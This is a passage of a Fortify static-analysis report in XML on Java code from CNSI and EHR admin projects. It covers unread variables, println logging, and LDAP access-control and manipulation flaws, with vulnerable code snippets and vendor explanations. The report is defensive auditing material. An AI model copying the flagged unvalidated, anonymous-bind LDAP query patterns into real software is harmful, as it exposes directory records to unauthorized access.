<FileName>AppAreaDetCacheMgr.java</FileName>
<FilePath>CNSI-JAR/src/com/cnsi/cache/AppAreaDetCacheMgr.java</FilePath>
<LineStart>206</LineStart>
<Snippet>        }
        //end of try
        catch(Exception ex)
        {
            m_objLogger.log(Logger.SEVERITY_ERROR, getClass(), l_sFnName,</Snippet>
<TargetFunction>CatchBlock()</TargetFunction>
                            </Primary>
                        </Issue>
                    </GroupingSection>
                    <GroupingSection count="269">
                        <groupTitle>Poor Style: Value Never Read</groupTitle>
                        <MajorAttributeSummary>
                            <MetaInfo>
<Name>Abstract</Name>
<Value>The method main() in ActionMapper.java never uses the value it assigns to the variable l_objActionMapper on line 1080.</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Explanation</Name>
<Value>This variable's value is not used. After the assignment, the variable is either assigned another value or goes out of scope.

Example: The following code excerpt assigns to the variable r and then overwrites the value without using it.


  r = getName();
  r = getNewBuffer(buf);
</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Recommendations</Name>
<Value>Remove unnecessary assignments in order to make the code easier to understand and maintain.</Value>
                            </MetaInfo>
                            <AttributeValue>
<Name>&lt;Unaudited&gt;</Name>
<Count>269</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Not an Issue</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Reliability Issue</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Bad Practice</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Suspicious</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Exploitable</Name>
<Count>0</Count>
                            </AttributeValue>
                        </MajorAttributeSummary>
                        <Issue iid="A25492530549D8BE805B5719C6B99989" ruleID="B30AA17C-87EC-42CF-9160-CFDF122CE28E">
                            <Category>Poor Style: Value Never Read</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Code Quality</Kingdom>
                            <Abstract>The method main() in ActionMapper.java never uses the value it assigns to the variable l_objActionMapper on line 1080.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>ActionMapper.java</FileName>
<FilePath>CNSI-JAR/src/com/cnsi/base/ActionMapper.java</FilePath>
<LineStart>1080</LineStart>
<Snippet>      xmlFileName.add("C:\\ecams\\xml\\defaultAction.xml");
      
      ActionMapper l_objActionMapper = new ActionMapper( "C:\\ecams\\xml\\ACTIONJING.xml", xmlFileName);
      /*
      System.out.println("RequestHandler for HomePage " + l_objActionMapper.getPageRequestHandlerClass("security","HomePage"));</Snippet>
<TargetFunction>VariableAccess: l_objActionMapper</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="E8D22AF70642A5B753C3E8A0D80575CE" ruleID="B30AA17C-87EC-42CF-9160-CFDF122CE28E">
                            <Category>Poor Style: Value Never Read</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Code Quality</Kingdom>
                            <Abstract>The method processRequest() in AppAreaDetCacheMgr.java never uses the value it assigns to the variable b_bRetVal on line 142.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>AppAreaDetCacheMgr.java</FileName>
<FilePath>CNSI-JAR/src/com/cnsi/cache/AppAreaDetCacheMgr.java</FilePath>
<LineStart>142</LineStart>
<Snippet>   public boolean processRequest(Collection p_objRefreshKeys)
    {
        boolean b_bRetVal = false;
        String l_sFnName = "processRequest";
</Snippet>
<TargetFunction>VariableAccess: b_bRetVal</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="C2CDDECC2ADE8CA906B9DC74E511730E" ruleID="B30AA17C-87EC-42CF-9160-CFDF122CE28E">
                            <Category>Poor Style: Value Never Read</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Code Quality</Kingdom>
                            <Abstract>The method processRequest() in AppAreaDetCacheMgr.java never uses the value it assigns to the variable b_sAppAreaName on line 172.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>AppAreaDetCacheMgr.java</FileName>
<FilePath>CNSI-JAR/src/com/cnsi/cache/AppAreaDetCacheMgr.java</FilePath>
<LineStart>172</LineStart>
<Snippet>                    String b_sAppAreaId=
                      (String)b_mapRecord.get(CNSIDataDictionary.APPLICATION_AREA.APLCTN_AREA_SID);
                    String b_sAppAreaName=
                      (String)b_mapRecord.get(CNSIDataDictionary.APPLICATION_AREA.APLCTN_AREA_NAME);
                    String b_sAppAreaDefaultPgName=</Snippet>
<TargetFunction>VariableAccess: b_sAppAreaName</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="9558681E248E9883A692D116311A8243" ruleID="B30AA17C-87EC-42CF-9160-CFDF122CE28E">
                            <Category>Poor Style: Value Never Read</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Code Quality</Kingdom>
                            <Abstract>The method processRequest() in AppAreaDetCacheMgr.java never uses the value it assigns to the variable b_sAppAreaId on line 170.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>AppAreaDetCacheMgr.java</FileName>
<FilePath>CNSI-JAR/src/com/cnsi/cache/AppAreaDetCacheMgr.java</FilePath>
<LineStart>170</LineStart>
<Snippet>                {
                    Map b_mapRecord = (Map) b_lstAppAreas.get(i);
                    String b_sAppAreaId=
                      (String)b_mapRecord.get(CNSIDataDictionary.APPLICATION_AREA.APLCTN_AREA_SID);
                    String b_sAppAreaName=</Snippet>
<TargetFunction>VariableAccess: b_sAppAreaId</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="5D3F2780B9A9B2CA447DC2EF604D03D9" ruleID="B30AA17C-87EC-42CF-9160-CFDF122CE28E">
                            <Category>Poor Style: Value Never Read</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Code Quality</Kingdom>
                            <Abstract>The method processRequest() in AppAreaDetCacheMgr.java never uses the value it assigns to the variable b_sAppAreaDefaultPgName on line 174.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>AppAreaDetCacheMgr.java</FileName>
<FilePath>CNSI-JAR/src/com/cnsi/cache/AppAreaDetCacheMgr.java</FilePath>
<LineStart>174</LineStart>
<Snippet>                    String b_sAppAreaName=
                      (String)b_mapRecord.get(CNSIDataDictionary.APPLICATION_AREA.APLCTN_AREA_NAME);
                    String b_sAppAreaDefaultPgName=
                      (String)b_mapRecord.get(CNSIDataDictionary.PAGE.PG_NAME);
                    String b_sAppAreaType=</Snippet>
<TargetFunction>VariableAccess: b_sAppAreaDefaultPgName</TargetFunction>
                            </Primary>
                        </Issue>
                    </GroupingSection>
                    <GroupingSection count="229">
                        <groupTitle>Access Control: LDAP</groupTitle>
                        <MajorAttributeSummary>
                            <MetaInfo>
<Name>Abstract</Name>
<Value>Without proper access control, the method getDomainsAssociatedToUser() in LDAPDomainDAOImpl.java can execute an LDAP statement on line 66 that contains an attacker-controlled value, thereby allowing the attacker to access unauthorized directory entries.</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Explanation</Name>
<Value>Database access control errors occur when:

1.	Data enters a program from an untrusted source.

2.	The data is used to specify a data value in an LDAP query.

Example 1: The employee ID of the current authenticated user is automatically submitted with each request by the client-side interface. The following code properly validates an employee ID as an integer before using it to construct an LDAP query. This validation prevents LDAP injection vulnerabilities, but may still leave the code vulnerable.


...
env.put(Context.SECURITY_AUTHENTICATION, "none");
DirContext ctx = new InitialDirContext(env);

String empID = request.getParameter("empID");

try
{
  int id = Integer.parseInt(empID);

  BasicAttribute attr = new BasicAttribute("empID", empID);

  NamingEnumeration employee =
            ctx.search("ou=People,dc=example,dc=com",attr);
...



The problem is that the developer has failed to consider what would happen if an attacker provides alternate values of empID. Although the interface automatically submits the employee ID of the current user, an attacker could submit an alternative value as part of a malicious request. Because the code in this example executes the query under an anonymous bind, it will return the directory entry for any valid employee ID, regardless of the identity of the current authenticated user.</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Recommendations</Name>
<Value>Rather than relying on the presentation layer to restrict values submitted by the user, the application should perform explicit validation and enforce access control constraints by binding to the directory as a specific user. Under no circumstances should a user be allowed to retrieve or modify a record in the directory without the appropriate permissions. Every query that accesses the directory should enforce this policy, which means that only very limited queries should be performed under anonymous binds, which effectively negate the access control mechanisms built into the LDAP system.

Example 2: The following code implements the same functionality as Example 1 but uses LDAP simple authentication to ensure that the query only affects records the current user is permitted to access.


...
String employeePass = request.getParameter("userCred");
String empID = request.getParameter("empID");

env.put(Context.SECURITY_AUTHENTICATION, "simple");
env.put(Context.SECURITY_PRINCIPAL, "cn="+empID);
env.put(Context.SECURITY_CREDENTIALS, employeePass);
DirContext ctx = new InitialDirContext(env);

try
{
  int id = Integer.parseInt(empID);

  BasicAttribute attr = new BasicAttribute("empID", empID);

  NamingEnumeration employee =
            ctx.search("ou=People,dc=example,dc=com",attr);
...
</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Tips</Name>
<Value>1. A number of modern web frameworks provide mechanisms to perform user input validation (including Struts and Spring MVC). To highlight the unvalidated sources of input, the Fortify Secure Coding Rulepacks dynamically re-prioritize the issues reported by Fortify Static Code Analyzer by lowering their probability of exploit and providing pointers to the supporting evidence whenever the framework validation mechanism is in use. We refer to this feature as Context-Sensitive Ranking. To further assist the Fortify user with the auditing process, the Fortify Software Security Research group makes available the Data Validation project template that groups the issues into folders based on the validation mechanism applied to their source of input.</Value>
                            </MetaInfo>
                            <AttributeValue>
<Name>&lt;Unaudited&gt;</Name>
<Count>229</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Not an Issue</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Reliability Issue</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Bad Practice</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Suspicious</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Exploitable</Name>
<Count>0</Count>
                            </AttributeValue>
                        </MajorAttributeSummary>
                        <Issue iid="E85B3A887103F055A6D9AD1882907640" ruleID="A98B9F6E-E78B-45A2-9042-7A7AFE2B2C62">
                            <Category>Access Control: LDAP</Category>
                            <Folder>High</Folder>
                            <Kingdom>Security Features</Kingdom>
                            <Abstract>Without proper access control, the method getDomainsAssociatedToProfile() in LDAPDomainDAOImpl.java can execute an LDAP statement on line 100 that contains an attacker-controlled value, thereby allowing the attacker to access unauthorized directory entries.</Abstract>
                            <Friority>High</Friority>
                            <Primary>
<FileName>LDAPDomainDAOImpl.java</FileName>
<FilePath>EHR-ADMIN-JAR/src/com/ehr/service/impl/ldap/LDAPDomainDAOImpl.java</FilePath>
<LineStart>100</LineStart>
<Snippet>	}
	public List getDomainsAssociatedToProfile(String profilename){		
		EqualsFilter filter = new EqualsFilter("sn",profilename);
		return ldapTemplate.search(new DistinguishedName("cn=DOMAIN_X_PROFILE"), filter.encode(),new AssociationContextMapper());
	}</Snippet>
<TargetFunction>org.springframework.ldap.filter.EqualsFilter.EqualsFilter()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>LDAPProfileDAOImpl.java</FileName>
<FilePath>EHR-ADMIN-JAR/src/com/ehr/service/impl/ldap/LDAPProfileDAOImpl.java</FilePath>
<LineStart>135</LineStart>
<Snippet>	public List getProfileByProfileSid(String profilesid){
		EqualsFilter filter = new EqualsFilter("uniqueIdentifier", profilesid);
		return ldapTemplate.search(new DistinguishedName("cn=PROFILES"), filter.encode(), getContextMapper());
	}
	</Snippet>
<TargetFunction>org.springframework.ldap.core.LdapTemplate.search()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="DA484DABBB7DCFD7A125E65A7F6B6CAF" ruleID="D5994032-B35D-445A-A482-0D4A9669231E">
                            <Category>Access Control: LDAP</Category>
                            <Folder>High</Folder>
                            <Kingdom>Security Features</Kingdom>
                            <Abstract>Without proper access control, the method getDomainsAssociatedToUser() in LDAPDomainDAOImpl.java can execute an LDAP statement on line 67 that contains an attacker-controlled value, thereby allowing the attacker to access unauthorized directory entries.</Abstract>
                            <Friority>High</Friority>
                            <Primary>
<FileName>LDAPDomainDAOImpl.java</FileName>
<FilePath>EHR-ADMIN-JAR/src/com/ehr/service/impl/ldap/LDAPDomainDAOImpl.java</FilePath>
<LineStart>67</LineStart>
<Snippet>	public List getDomainsAssociatedToUser(String userloginid){
		EqualsFilter filter = new EqualsFilter("sn",userloginid);
		List l_lstAssociated= ldapTemplate.search(new DistinguishedName("cn=DOMAIN_X_USER"), filter.encode(),new AssociationContextMapper());
		
		OrFilter orfilter = new OrFilter();</Snippet>
<TargetFunction>org.springframework.ldap.core.LdapTemplate.search()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>LDAPUserDAOImpl.java</FileName>
<FilePath>EHR-ADMIN-JAR/src/com/ehr/service/impl/ldap/LDAPUserDAOImpl.java</FilePath>
<LineStart>104</LineStart>
<Snippet>	public List getUserByAccountSid(String accountsid){
		EqualsFilter filter = new EqualsFilter("uniqueIdentifier", accountsid);
		return ldapTemplate.search(new DistinguishedName("cn=USERS"), filter.encode(), getContextMapper());
	}
	public List getDomainsAssociatedToUser(String domainname){</Snippet>
<TargetFunction>org.springframework.ldap.core.LdapTemplate.search()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="9053F3EA83F96D95F5A2644468691168" ruleID="A98B9F6E-E78B-45A2-9042-7A7AFE2B2C62">
                            <Category>Access Control: LDAP</Category>
                            <Folder>High</Folder>
                            <Kingdom>Security Features</Kingdom>
                            <Abstract>Without proper access control, the method getDomainsAssociatedToUser() in LDAPDomainDAOImpl.java can execute an LDAP statement on line 73 that contains an attacker-controlled value, thereby allowing the attacker to access unauthorized directory entries.</Abstract>
                            <Friority>High</Friority>
                            <Primary>
<FileName>LDAPDomainDAOImpl.java</FileName>
<FilePath>EHR-ADMIN-JAR/src/com/ehr/service/impl/ldap/LDAPDomainDAOImpl.java</FilePath>
<LineStart>73</LineStart>
<Snippet>		for(int i=0;i&lt;l_lstAssociated.size();i++){
			Association l_objAssociation = (Association)l_lstAssociated.get(i);								
			orfilter.append(new EqualsFilter ("cn", l_objAssociation.getName()));			
		}								
		if(orfilter.toString().equalsIgnoreCase("")){</Snippet>
<TargetFunction>org.springframework.ldap.filter.EqualsFilter.EqualsFilter()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>LDAPDomainDAOImpl.java</FileName>
<FilePath>EHR-ADMIN-JAR/src/com/ehr/service/impl/ldap/LDAPDomainDAOImpl.java</FilePath>
<LineStart>67</LineStart>
<Snippet>	public List getDomainsAssociatedToUser(String userloginid){
		EqualsFilter filter = new EqualsFilter("sn",userloginid);
		List l_lstAssociated= ldapTemplate.search(new DistinguishedName("cn=DOMAIN_X_USER"), filter.encode(),new AssociationContextMapper());
		
		OrFilter orfilter = new OrFilter();</Snippet>
<TargetFunction>org.springframework.ldap.core.LdapTemplate.search()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="0DB855A8DB1E0D38C193511208CFF0E2" ruleID="A98B9F6E-E78B-45A2-9042-7A7AFE2B2C62">
                            <Category>Access Control: LDAP</Category>
                            <Folder>High</Folder>
                            <Kingdom>Security Features</Kingdom>
                            <Abstract>Without proper access control, the method getDomainsToAssociateToUser() in LDAPDomainDAOImpl.java can execute an LDAP statement on line 88 that contains an attacker-controlled value, thereby allowing the attacker to access unauthorized directory entries.</Abstract>
                            <Friority>High</Friority>
                            <Primary>
<FileName>LDAPDomainDAOImpl.java</FileName>
<FilePath>EHR-ADMIN-JAR/src/com/ehr/service/impl/ldap/LDAPDomainDAOImpl.java</FilePath>
<LineStart>88</LineStart>
<Snippet>		for(int i=0;i&lt;l_lstAssociated.size();i++){
			Domain l_objDomain = (Domain)l_lstAssociated.get(i);
			orfilter.append(new EqualsFilter("cn", l_objDomain.getDomainname()));			
		}		
				</Snippet>
<TargetFunction>org.springframework.ldap.filter.EqualsFilter.EqualsFilter()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>LDAPDomainDAOImpl.java</FileName>
<FilePath>EHR-ADMIN-JAR/src/com/ehr/service/impl/ldap/LDAPDomainDAOImpl.java</FilePath>
<LineStart>78</LineStart>
<Snippet>			return new CNSIList();
		}else{
			return ldapTemplate.search(new DistinguishedName("cn=DOMAINS"), orfilter.encode(), getContextMapper());
		}						
	}</Snippet>
<TargetFunction>org.springframework.ldap.core.LdapTemplate.search()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="E6327E163777FBFEC42DB7687EF39108" ruleID="A98B9F6E-E78B-45A2-9042-7A7AFE2B2C62">
                            <Category>Access Control: LDAP</Category>
                            <Folder>High</Folder>
                            <Kingdom>Security Features</Kingdom>
                            <Abstract>Without proper access control, the method getDomainsAssociatedToUser() in LDAPDomainDAOImpl.java can execute an LDAP statement on line 66 that contains an attacker-controlled value, thereby allowing the attacker to access unauthorized directory entries.</Abstract>
                            <Friority>High</Friority>
                            <Primary>
<FileName>LDAPDomainDAOImpl.java</FileName>
<FilePath>EHR-ADMIN-JAR/src/com/ehr/service/impl/ldap/LDAPDomainDAOImpl.java</FilePath>
<LineStart>66</LineStart>
<Snippet>	}
	public List getDomainsAssociatedToUser(String userloginid){
		EqualsFilter filter = new EqualsFilter("sn",userloginid);
		List l_lstAssociated= ldapTemplate.search(new DistinguishedName("cn=DOMAIN_X_USER"), filter.encode(),new AssociationContextMapper());
		</Snippet>
<TargetFunction>org.springframework.ldap.filter.EqualsFilter.EqualsFilter()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>LDAPUserDAOImpl.java</FileName>
<FilePath>EHR-ADMIN-JAR/src/com/ehr/service/impl/ldap/LDAPUserDAOImpl.java</FilePath>
<LineStart>104</LineStart>
<Snippet>	public List getUserByAccountSid(String accountsid){
		EqualsFilter filter = new EqualsFilter("uniqueIdentifier", accountsid);
		return ldapTemplate.search(new DistinguishedName("cn=USERS"), filter.encode(), getContextMapper());
	}
	public List getDomainsAssociatedToUser(String domainname){</Snippet>
<TargetFunction>org.springframework.ldap.core.LdapTemplate.search()</TargetFunction>
                            </Source>
                        </Issue>
                    </GroupingSection>
                    <GroupingSection count="197">
                        <groupTitle>Poor Logging Practice: Use of a System Output Stream</groupTitle>
                        <MajorAttributeSummary>
                            <MetaInfo>
<Name>Abstract</Name>
<Value>Using println() rather than a dedicated logging facility makes it difficult to monitor the behavior of the program.</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Explanation</Name>
<Value>Example 1: The first Java program that a developer learns to write is the following:


public class MyClass
  public static void main(String[] args) {
    System.out.println("hello world");
  }
}


While most programmers go on to learn many nuances and subtleties about Java, a surprising number hang on to this first lesson and never give up on writing messages to standard output using System.out.println().

The problem is that writing directly to standard output or standard error is often used as an unstructured form of logging. Structured logging facilities provide features like logging levels, uniform formatting, a logger identifier, timestamps, and, perhaps most critically, the ability to direct the log messages to the right place. When the use of system output streams is jumbled together with the code that uses loggers properly, the result is often a well-kept log that is missing critical information.

Developers widely accept the need for structured logging, but many continue to use system output streams in their "pre-production" development. If the code you are reviewing is past the initial phases of development, use of System.out or System.err may indicate an oversight in the move to a structured logging system.</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Recommendations</Name>
<Value>Use a Java logging facility rather than System.out or System.err.

Example 2: For example, you can rewrite the "hello world" program in Example 1 using log4j as follows:


import org.apache.log4j.Logger;
import org.apache.log4j.BasicConfigurator;

public class MyClass {
  private final static Logger logger =
            Logger.getLogger(MyClass.class);

  public static void main(String[] args) {
    BasicConfigurator.configure();
    logger.info("hello world");
  }
}
</Value>
                            </MetaInfo>
                            <AttributeValue>
<Name>&lt;Unaudited&gt;</Name>
<Count>197</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Not an Issue</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Reliability Issue</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Bad Practice</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Suspicious</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Exploitable</Name>
<Count>0</Count>
                            </AttributeValue>
                        </MajorAttributeSummary>
                        <Issue iid="39B0ED786FDD20D911B1FAD35EB7EC95" ruleID="F972FE42-6C15-47D2-BD5C-448166A574C2">
                            <Category>Poor Logging Practice: Use of a System Output Stream</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>Using println() rather than a dedicated logging facility makes it difficult to monitor the behavior of the program.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>ActionMapper.java</FileName>
<FilePath>CNSI-JAR/src/com/cnsi/base/ActionMapper.java</FilePath>
<LineStart>1093</LineStart>
<Snippet>    {
      e.printStackTrace();
      System.out.println("Error during creation: " + e.getMessage());
    } //catch
  } // main()</Snippet>
<TargetFunction>FunctionCall: println()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="61EFAF106978B6993200707EE309C167" ruleID="F972FE42-6C15-47D2-BD5C-448166A574C2">
                            <Category>Poor Logging Practice: Use of a System Output Stream</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>Using println() rather than a dedicated logging facility makes it difficult to monitor the behavior of the program.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>CNSIEditorBean.java</FileName>
<FilePath>CNSI-JAR/src/com/cnsi/common/CNSIEditorBean.java</FilePath>
<LineStart>506</LineStart>
<Snippet>			bean.updateDataFields(map);

			System.out.println(bean.getContent());

			System.exit(0);</Snippet>
<TargetFunction>FunctionCall: println()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="6F77FDAC2FA35562ABBF54C0BE3224B5" ruleID="F972FE42-6C15-47D2-BD5C-448166A574C2">
                            <Category>Poor Logging Practice: Use of a System Output Stream</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>Using println() rather than a dedicated logging facility makes it difficult to monitor the behavior of the program.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>ActionMapper.java</FileName>
<FilePath>CNSI-JAR/src/com/cnsi/base/ActionMapper.java</FilePath>
<LineStart>1072</LineStart>
<Snippet>      System.out.println("This is the starting point: " );
      Logger.createLogger("test.xml");
      System.out.println("\n");
      List xmlFileName = new CNSIList(5);
      xmlFileName.add("C:\\ecams\\xml\\loginAction.xml");</Snippet>
<TargetFunction>FunctionCall: println()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="04CF935E82116B32FA4083CD137A8E8A" ruleID="F972FE42-6C15-47D2-BD5C-448166A574C2">
                            <Category>Poor Logging Practice: Use of a System Output Stream</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>Using println() rather than a dedicated logging facility makes it difficult to monitor the behavior of the program.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>CacheManagerRepositoryImpl.java</FileName>
<FilePath>CNSI-JAR/src/com/cnsi/cache/CacheManagerRepositoryImpl.java</FilePath>
<LineStart>170</LineStart>
<Snippet> public void logMsg(String p_sMsg)
 {
         System.out.println(p_sMsg);
 }//end of logMsg(String p_sMsg)
}</Snippet>
<TargetFunction>FunctionCall: println()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="941F526453A12285235BB9F66609C63D" ruleID="F972FE42-6C15-47D2-BD5C-448166A574C2">
                            <Category>Poor Logging Practice: Use of a System Output Stream</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>Using println() rather than a dedicated logging facility makes it difficult to monitor the behavior of the program.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>ActionMapper.java</FileName>
<FilePath>CNSI-JAR/src/com/cnsi/base/ActionMapper.java</FilePath>
<LineStart>1070</LineStart>
<Snippet>    {

      System.out.println("This is the starting point: " );
      Logger.createLogger("test.xml");
      System.out.println("\n");</Snippet>
<TargetFunction>FunctionCall: println()</TargetFunction>
                            </Primary>
                        </Issue>
                    </GroupingSection>
                    <GroupingSection count="136">
                        <groupTitle>LDAP Manipulation</groupTitle>
                        <MajorAttributeSummary>
                            <MetaInfo>
<Name>Abstract</Name>
<Value>The method getRoleIDsFromLDAP() in SecurityUtil.java executes an LDAP statement that contains unvalidated input, which can allow an attacker to alter the statement's meaning or execute arbitrary LDAP commands.</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Explanation</Name>
<Value>LDAP manipulation errors occur when:

1.	Data enters a program from an untrusted source.

2.	The data is used outside the filter string in a dynamic LDAP statement.

Example 1: The following code reads a username and password from an HTTP request and uses it to perform an LDAP lookup.


env.put(Context.SECURITY_AUTHENTICATION, "none");
DirContext ctx = new InitialDirContext(env);

String empID = request.getParameter("empID");

try
{
  BasicAttribute attr = new BasicAttribute("empID", empID);

  NamingEnumeration employee =
            ctx.search("ou=People,dc=example,dc=com",attr);
...


Because the query includes user input and is performed under an anonymous bind, the query will return the details for any username specified, regardless of whether it matches the specified password. An attacker may effectively use the following code to lookup the details of any employee in the system, representing a serious privacy violation. The problem is that the developer failed to leverage the appropriate access control mechanisms necessary to restrict the query to access only employee records that the current user is permitted to read.</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Recommendations</Name>
<Value>Rather than relying on the presentation layer to restrict values submitted by the user, the application should perform explicit validation and enforce access control constraints by binding to the directory as a specific user. Under no circumstances should a user be allowed to retrieve or modify a record in the directory without the appropriate permissions. Every query that accesses the directory should enforce this policy, which means that only very limited queries should be performed under anonymous binds, which effectively negate the access control mechanisms built into the LDAP system.

Example 2: The following code implements the same functionality as Example 1 but uses LDAP simple authentication to ensure that the query only affects records the current user is permitted to access and parses the employee ID as a number to ensure that it cannot contain any LDAP metacharacters.


...
String employeePass = request.getParameter("userCred");
String empID = request.getParameter("empID");

env.put(Context.SECURITY_AUTHENTICATION, "simple");
env.put(Context.SECURITY_PRINCIPAL, "cn="+empID);
env.put(Context.SECURITY_CREDENTIALS, employeePass);
DirContext ctx = new InitialDirContext(env);

try
{
  int id = Integer.parseInt(empID);

  BasicAttribute attr = new BasicAttribute("empID", empID);

  NamingEnumeration employee =
            ctx.search("ou=People,dc=example,dc=com",attr);
...
</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Tips</Name>
<Value>1. A number of modern web frameworks provide mechanisms to perform user input validation (including Struts and Spring MVC). To highlight the unvalidated sources of input, the Fortify Secure Coding Rulepacks dynamically re-prioritize the issues reported by Fortify Static Code Analyzer by lowering their probability of exploit and providing pointers to the supporting evidence whenever the framework validation mechanism is in use. We refer to this feature as Context-Sensitive Ranking. To further assist the Fortify user with the auditing process, the Fortify Software Security Research group makes available the Data Validation project template that groups the issues into folders based on the validation mechanism applied to their source of input.</Value>
                            </MetaInfo>
                            <AttributeValue>
<Name>&lt;Unaudited&gt;</Name>
<Count>136</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Not an Issue</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Reliability Issue</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Bad Practice</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Suspicious</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Exploitable</Name>
<Count>0</Count>
                            </AttributeValue>
                        </MajorAttributeSummary>
                        <Issue iid="47B9B71BD11BDEE0C23731C0696F11F2" ruleID="A027E650-701F-44F5-8BE9-10435A764119">
                            <Category>LDAP Manipulation</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>The method getRoleIDsFromLDAP() in SecurityUtil.java executes an LDAP statement that contains unvalidated input, which can allow an attacker to alter the statement's meaning or execute arbitrary LDAP commands.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>SecurityUtil.java</FileName>
<FilePath>CNSI-JAR/src/com/cnsi/security/common/SecurityUtil.java</FilePath>
<LineStart>937</LineStart>
<Snippet>		}
	 	
		matchAttrs.put(new BasicAttribute("ou",l_sProfileName));
		matchAttrs.put(new BasicAttribute("organizationalStatus","Active"));
		</Snippet>
<TargetFunction>javax.naming.directory.BasicAttribute.BasicAttribute()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>LDAPProfileDAOImpl.java</FileName>
<FilePath>EHR-ADMIN-JAR/src/com/ehr/service/impl/ldap/LDAPProfileDAOImpl.java</FilePath>
<LineStart>106</LineStart>
<Snippet>		}else{
			
			List l_lstProfile = ldapTemplate.search(new DistinguishedName("cn=PROFILES"), andfilter.encode(), getContextMapper());
			
			for(int i=0;i&lt;l_lstProfile.size();i++){</Snippet>
<TargetFunction>org.springframework.ldap.core.LdapTemplate.search()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="8233F3B94879816B93CCA73CFDF79CB8" ruleID="A027E650-701F-44F5-8BE9-10435A764119">
                            <Category>LDAP Manipulation</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>The method getPageAccessIndicator() in SecurityUtil.java executes an LDAP statement that contains unvalidated input, which can allow an attacker to alter the statement's meaning or execute arbitrary LDAP commands.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>SecurityUtil.java</FileName>
<FilePath>CNSI-JAR/src/com/cnsi/security/common/SecurityUtil.java</FilePath>
<LineStart>1088</LineStart>
<Snippet>				    		try{
				    			matchAttrs=new BasicAttributes(true);					 			
					 			matchAttrs.put(new BasicAttribute("cn",pageName+"_"+ l_sRoleID));
					 			matchAttrs.put(new BasicAttribute("organizationalStatus","Active"));
